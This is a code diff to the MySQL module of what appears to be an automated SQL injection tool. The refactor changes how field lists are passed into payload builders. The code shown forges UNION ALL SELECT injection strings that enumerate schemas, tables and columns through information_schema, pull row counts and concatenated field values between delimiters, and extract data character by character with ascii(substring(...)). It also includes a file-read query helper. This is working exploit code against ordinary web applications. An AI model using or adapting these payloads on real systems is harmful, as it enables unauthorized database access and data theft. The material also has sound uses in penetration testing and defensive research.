@@ -44,48 +44,35 @@ class MysqlMole(DbmsMole):
     def _schemas_query_info(self):
         return {
             'table' : 'information_schema.schemata',
-            'field' : 'schema_name'
+            'field' : ['schema_name']
         }
     
     def _tables_query_info(self, db):
         return {
             'table' : 'information_schema.tables',
-            'field' : 'table_name',
+            'field' : ['table_name'],
             'filter': "table_schema = '{db}'".format(db=db)
         }
     
     def _columns_query_info(self, db, table):
         return {
             'table' : 'information_schema.columns',
-            'field' : 'column_name',
+            'field' : ['column_name'],
             'filter': "table_schema = '{db}' and table_name = '{table}'".format(db=db, table=table)
         }
         
     def _fields_query_info(self, fields, db, table, where):
-        if not self.finger or self.finger.is_string_query:
-            return {
-                'table' : db + '.' + table,
-                'field' : ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)),
-                'filter': where
-            }
-        else:
-            return {
-                'table' : db + '.' + table,
-                'field' : self._concat_fields(fields),
-                'filter': where
-            }
+        return {
+            'table' : db + '.' + table,
+            'field' : fields,
+            'filter': where
+        }
         
     def _dbinfo_query_info(self):
-        if not self.finger or self.finger.is_string_query:
-            return {
-                'field' : 'user(),version(),database()', 
-                'table' : ''
-            }
-        else:
-            return {
-                'field' : self._concat_fields(['user()','version()','database()']), 
-                'table' : ''
-            }
+        return {
+            'field' : ['user()','version()','database()'], 
+            'table' : ''
+        }
     
     def _read_file_query_info(self, filename):
         return {
@@ -141,8 +128,6 @@ class MysqlMole(DbmsMole):
         return ' and 0 < (select length(@@version)) '
 
     def forge_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
-        if not self.finger is None and not self.finger.is_string_query:
-            return self.forge_integer_count_query(column_count, fields, table_name, injectable_field, where)
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(map(str, range(column_count)))
         query_list[injectable_field] = ("CONCAT(" + MysqlMole.out_delimiter + ",COUNT(*)," + MysqlMole.out_delimiter + ")")
@@ -159,7 +144,7 @@ class MysqlMole(DbmsMole):
                                             MysqlMole.out_delimiter +
                                             ",CONCAT_WS(" +
                                                 MysqlMole.inner_delimiter + "," + 
-                                                fields +
+                                                ','.join(fields) +
                                             ")," +
                                             MysqlMole.out_delimiter +
                                         ")")
@@ -193,7 +178,7 @@ class MysqlMole(DbmsMole):
         query = ' and 1=0 union all select '
         query_list = list(self.finger._query)
         query_list[injectable_field] = ('concat(' + MysqlMole.integer_out_delimiter + 
-               ',ascii(substring(concat('+fields+'), '+str(index)+', 1)), ' + MysqlMole.integer_out_delimiter + ')')
+               ',ascii(substring(concat('+self._concat_fields(fields)+'), '+str(index)+', 1)), ' + MysqlMole.integer_out_delimiter + ')')
         query += ','.join(query_list)
         query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
         return query
@@ -207,7 +192,7 @@ class MysqlMole(DbmsMole):
         query = ' and 1=0 union all select '
         query_list = list(self.finger._query)
         query_list[injectable_field] = ('concat(' + MysqlMole.integer_out_delimiter + 
-               ',length(concat('+fields+')),' + MysqlMole.integer_out_delimiter+ ')')
+               ',length(concat('+self._concat_fields(fields)+')),' + MysqlMole.integer_out_delimiter+ ')')
         query += ','.join(query_list)
         query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
         return query
